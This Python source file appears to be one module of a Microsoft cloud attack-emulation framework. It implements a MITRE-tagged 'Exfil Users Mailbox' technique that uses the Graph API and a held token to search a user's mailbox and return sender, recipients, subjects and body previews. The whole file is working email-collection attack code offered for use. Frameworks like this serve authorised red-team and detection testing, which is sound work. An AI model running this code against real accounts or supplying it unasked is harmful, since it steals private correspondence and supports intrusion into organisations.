from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class M365ExfilUserMailbox(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1114.002",
                technique_name="Email Collection",
                tactics=["Collection"],
                sub_technique_name="Remote Email Collection"
            )
        ]
        super().__init__("Exfil Users Mailbox", "Perform email reconnaissance leveraging Microsoft Graph API to exfiltrate emails from a target user's mailbox. Technique can perform targeted searches across email fields (body, subject, attachments, sender) and extract sensitive information including sender details, recipients, subjects, and message previews - making it useful for both broad mailbox enumeration and focused data collection. Warning: Attempting to exfiltrate entire mailbox can take really long time.", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)

        try:
            search_term: str = kwargs.get('search_term', None)
            search_field: str = kwargs.get('search_field', None)
            
            search_field_options = ['body','subject','attachment','from']
            
            if search_term in ["", None]:
                endpoint_url = 'https://graph.microsoft.com/v1.0/me/messages?$select=id,from,toRecipients,subject,bodyPreview'
            
            else:
                endpoint_url = f'https://graph.microsoft.com/v1.0/me/messages?$search="{search_term}"&$select=id,from,toRecipients,subject,bodyPreview'

                if search_field:
                    if search_field not in search_field_options:
                        return ExecutionStatus.FAILURE, {
                            "error": {"Error" : "Invalid Technique Input"},
                            "message": {"Error" : f"Invalid Technique Input - Search Field must be in {search_field_options}"}
                        }
                    endpoint_url = f'https://graph.microsoft.com/v1.0/me/messages?$search="{search_field}:{search_term}"&$select=id,from,toRecipients,subject,bodyPreview'
            
            # Get emails from users mailbox
            raw_response = GraphRequest().get(url = endpoint_url)

            if 'error' in raw_response:
                return ExecutionStatus.FAILURE, {
                    "error": str(raw_response.get('error', "")),
                    "message": "Failed to exfil users mailbox"
                }

            email_collected = []

            for email in raw_response:

                # checking keys for inconsistent data in returned emails
                if 'subject' in email.keys():
                    subject = email.get('subject', 'N/A')
                else:
                    subject = 'N/A'
                if 'bodyPreview' in email.keys():
                    body_preview = email.get('bodyPreview', 'N/A')
                else:
                    body_preview = 'N/A'
                if 'from' in email.keys():
                    sender = f"{email.get('from', 'N/A').get('emailAddress').get('name', 'N/A')} - {email.get('from', 'N/A').get('emailAddress').get('address', 'N/A')}"
                else:
                    sender = 'N/A'
                if 'toRecipients' in email.keys():
                    recipient = email.get('toRecipients', 'N/A')
                else:
                    recipient = 'N/A'

                email_collected.append({
                    'Subject' : subject,
                    'Body Preview' : body_preview,
                    'From (Sender)' : sender,
                    'To (Recipient)' : recipient
                })
        
            if email_collected:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully collected {len(email_collected)} emails from users mailbox",
                    "value": email_collected
                }
            else:
                return ExecutionStatus.SUCCESS, {
                    "message": f"No emails found in users mailbox",
                    "value": []
                }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to collect emails from users mailbox"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "search_term": {
                "type": "str", 
                "required": False, 
                "default":None, 
                "name": "Search Keyword", 
                "input_field_type" : "text"
            },
            "search_field": {
                "type": "str", 
                "required": False, 
                "default":None, 
                "name": "Search Field (Options: body / subject / attachment / from)", 
                "input_field_type" : "text"
            }
        }